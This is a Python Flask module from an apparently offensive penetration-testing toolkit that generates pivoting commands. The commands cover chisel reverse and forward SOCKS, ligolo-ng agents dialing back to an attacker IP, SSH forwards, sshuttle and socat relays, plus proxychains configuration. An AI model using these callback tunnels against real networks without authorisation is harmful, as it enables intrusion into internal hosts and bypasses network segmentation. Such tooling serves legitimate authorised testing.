"""Pivoting & tunnelling module for ZeroCool.

A catalog of tunnel recipes. Each recipe turns the engagement (your attacker IP)
plus a few inputs into:

  * an ATTACKER-side command — run as a background job inside ZeroCool (chisel
    server, ssh -D, ligolo-proxy, sshuttle …), and
  * a REMOTE-side command — copied onto the pivot/target (chisel client, ligolo
    agent, socat relay …).

Recipes that yield a SOCKS proxy plug into the proxychains integration below, so
the AD / Recon modules can route through the pivot. TUN-based recipes (Ligolo)
reach the internal subnet natively and need no proxychains.
"""

from __future__ import annotations

from flask import Blueprint, jsonify, render_template, request

import storage
import tools

pivot_bp = Blueprint("pivot", __name__)


def pv(ctx: dict, name: str, default: str = "") -> str:
    return (ctx["p"].get(name) or "").strip() or default


# --- Chisel ---
def r_chisel_rsocks(ctx):
    cp = pv(ctx, "chisel_port", "9001")
    return {
        "attacker": f"chisel server -p {cp} --reverse",
        "remote": f"chisel client {ctx['aip']}:{cp} R:socks",
        "socks": "127.0.0.1:1080",
        "notes": [
            "Reverse SOCKS5 — proxy ends up on the attacker at 127.0.0.1:1080.",
            "Set the SOCKS proxy below to 127.0.0.1:1080 to route AD/Recon through it.",
        ],
    }


def r_chisel_rfwd(ctx):
    cp = pv(ctx, "chisel_port", "9001")
    lport = pv(ctx, "lport", "8000")
    target = pv(ctx, "target", "10.10.0.5")
    rport = pv(ctx, "rport", "445")
    return {
        "attacker": f"chisel server -p {cp} --reverse",
        "remote": f"chisel client {ctx['aip']}:{cp} R:{lport}:{target}:{rport}",
        "socks": "",
        "notes": [f"Internal {target}:{rport} becomes reachable at 127.0.0.1:{lport} on the attacker."],
    }


def r_chisel_fsocks(ctx):
    cp = pv(ctx, "chisel_port", "9001")
    pivot = pv(ctx, "pivot_ip", "10.10.0.5")
    lport = pv(ctx, "lport", "1080")
    return {
        "attacker": f"chisel client {pivot}:{cp} {lport}:socks",
        "remote": f"chisel server -p {cp} --socks5",
        "socks": f"127.0.0.1:{lport}",
        "notes": ["Forward SOCKS — chisel server runs on the pivot, you connect out to it."],
    }


# --- Ligolo-ng ---
def r_ligolo(ctx):
    lp = pv(ctx, "ligolo_port", "11601")
    subnet = pv(ctx, "subnet", "10.10.0.0/24")
    return {
        "attacker": f"ligolo-proxy -selfcert -laddr 0.0.0.0:{lp}",
        "remote": f"agent -connect {ctx['aip']}:{lp} -ignore-cert",
        "socks": "",
        "notes": [
            "One-time TUN setup: sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up",
            f"In the ligolo console after the agent connects: select the session, then "
            f"sudo ip route add {subnet} dev ligolo on the host, then 'start'.",
            "Ligolo is TUN-based — tools reach the subnet natively, no proxychains needed.",
        ],
    }


# --- SSH ---
def r_ssh_dsocks(ctx):
    u = pv(ctx, "ssh_user", "user")
    pivot = pv(ctx, "pivot_ip", "10.10.0.5")
    lport = pv(ctx, "lport", "1080")
    return {
        "attacker": f"ssh -D {lport} -N {u}@{pivot}",
        "remote": "",
        "socks": f"127.0.0.1:{lport}",
        "notes": ["Dynamic SOCKS proxy via SSH (needs creds on the pivot)."],
    }


def r_ssh_local(ctx):
    u = pv(ctx, "ssh_user", "user")
    pivot = pv(ctx, "pivot_ip", "10.10.0.5")
    lport = pv(ctx, "lport", "8000")
    target = pv(ctx, "target", "10.10.0.10")
    rport = pv(ctx, "rport", "445")
    return {
        "attacker": f"ssh -L {lport}:{target}:{rport} -N {u}@{pivot}",
        "remote": "",
        "socks": "",
        "notes": [f"Local forward — internal {target}:{rport} at 127.0.0.1:{lport}."],
    }


def r_ssh_remote(ctx):
    u = pv(ctx, "ssh_user", "user")
    pivot = pv(ctx, "pivot_ip", "10.10.0.5")
    lport = pv(ctx, "lport", "80")
    rport = pv(ctx, "rport", "8000")
    return {
        "attacker": f"ssh -R {rport}:127.0.0.1:{lport} -N {u}@{pivot}",
        "remote": "",
        "socks": "",
        "notes": [f"Remote forward — your 127.0.0.1:{lport} is exposed on the pivot as :{rport}."],
    }


def r_sshuttle(ctx):
    u = pv(ctx, "ssh_user", "user")
    pivot = pv(ctx, "pivot_ip", "10.10.0.5")
    subnet = pv(ctx, "subnet", "10.10.0.0/24")
    return {
        "attacker": f"sshuttle -r {u}@{pivot} {subnet}",
        "remote": "",
        "socks": "",
        "notes": ["VPN-like transparent routing over SSH — no proxychains needed."],
    }


# --- socat ---
def r_socat(ctx):
    lport = pv(ctx, "lport", "8000")
    target = pv(ctx, "target", "10.10.0.10")
    rport = pv(ctx, "rport", "445")
    return {
        "attacker": "",
        "remote": f"socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{target}:{rport}",
        "socks": "",
        "notes": [f"Run on a pivot you control — relays its :{lport} to {target}:{rport}."],
    }


I = lambda name, label, ph="", default="": {"name": name, "label": label, "placeholder": ph, "default": default}

PORT_IN = I("chisel_port", "Tunnel port", "9001", "9001")
SSH_USER = I("ssh_user", "SSH user", "pivotuser")
PIVOT_IN = I("pivot_ip", "Pivot host", "10.10.0.5")
TARGET_IN = I("target", "Internal target", "10.10.0.10")
LPORT = I("lport", "Local port", "8000")
RPORT = I("rport", "Remote port", "445")
SUBNET = I("subnet", "Internal subnet", "10.10.0.0/24")

RECIPES = [
    dict(id="chisel_rsocks", group="Chisel", label="Reverse SOCKS proxy",
         desc="Most common. Pivot calls back; SOCKS5 ends up on you.",
         inputs=[PORT_IN], build=r_chisel_rsocks),
    dict(id="chisel_rfwd", group="Chisel", label="Reverse port-forward",
         desc="Expose one internal host:port on your localhost.",
         inputs=[PORT_IN, TARGET_IN, RPORT, LPORT], build=r_chisel_rfwd),
    dict(id="chisel_fsocks", group="Chisel", label="Forward SOCKS proxy",
         desc="Chisel server on the pivot; you connect outbound.",
         inputs=[PORT_IN, PIVOT_IN, LPORT], build=r_chisel_fsocks),
    dict(id="ligolo", group="Ligolo-ng", label="Ligolo-ng (TUN)",
         desc="Agent dials back; reach the whole subnet via a tun interface.",
         inputs=[I("ligolo_port", "Listen port", "11601", "11601"), SUBNET], build=r_ligolo),
    dict(id="ssh_dsocks", group="SSH", label="Dynamic SOCKS (-D)",
         desc="SOCKS proxy through an SSH session to the pivot.",
         inputs=[SSH_USER, PIVOT_IN, I("lport", "SOCKS port", "1080", "1080")], build=r_ssh_dsocks),
    dict(id="ssh_local", group="SSH", label="Local forward (-L)",
         desc="Bind an internal host:port to your localhost.",
         inputs=[SSH_USER, PIVOT_IN, TARGET_IN, RPORT, LPORT], build=r_ssh_local),
    dict(id="ssh_remote", group="SSH", label="Remote forward (-R)",
         desc="Expose a local service on the pivot side.",
         inputs=[SSH_USER, PIVOT_IN, LPORT, RPORT], build=r_ssh_remote),
    dict(id="sshuttle", group="SSH", label="sshuttle (VPN)",
         desc="Transparent subnet routing over SSH.",
         inputs=[SSH_USER, PIVOT_IN, SUBNET], build=r_sshuttle),
    dict(id="socat", group="socat", label="socat relay",
         desc="TCP relay run on a pivot you control.",
         inputs=[TARGET_IN, RPORT, LPORT], build=r_socat),
]

RECIPES_BY_ID = {r["id"]: r for r in RECIPES}


def serializable_recipes():
    return [{"id": r["id"], "group": r["group"], "label": r["label"],
             "desc": r["desc"], "inputs": r["inputs"]} for r in RECIPES]


@pivot_bp.route("/pivot")
def pivot():
    eng = storage.load_engagement()
    recipes = serializable_recipes()
    groups = []
    for r in recipes:
        if r["group"] not in groups:
            groups.append(r["group"])
    return render_template("pivot.html", eng=eng, recipes=recipes, groups=groups)


@pivot_bp.route("/pivot/build", methods=["POST"])
def pivot_build():
    payload = request.get_json(silent=True) or {}
    recipe = RECIPES_BY_ID.get(payload.get("recipe_id"))
    if not recipe:
        return jsonify({"error": "unknown recipe"}), 400
    eng = storage.load_engagement()
    ctx = {"aip": (eng.get("attacker_ip") or "ATTACKER_IP"), "p": payload.get("params", {})}
    result = recipe["build"](ctx)
    result["label"] = recipe["label"]
    if not ctx["p"] and not eng.get("attacker_ip"):
        result.setdefault("warnings", []).append("Set your attacker IP in the engagement.")
    return jsonify(result)


@pivot_bp.route("/pivot/proxychains", methods=["POST"])
def pivot_proxychains():
    payload = request.get_json(silent=True) or {}
    proxy = (payload.get("proxy") or "").strip()
    if ":" not in proxy:
        return jsonify({"error": "expected host:port"}), 400
    host, _, port = proxy.rpartition(":")
    if not host or not port.isdigit():
        return jsonify({"error": "expected host:port"}), 400
    conf = tools.write_proxychains_conf(host, port)
    eng = storage.load_engagement()
    eng["socks_proxy"] = proxy
    storage.save_engagement(eng)
    return jsonify({"ok": True, "conf": conf, "prefix": tools.proxychains_prefix(), "proxy": proxy})
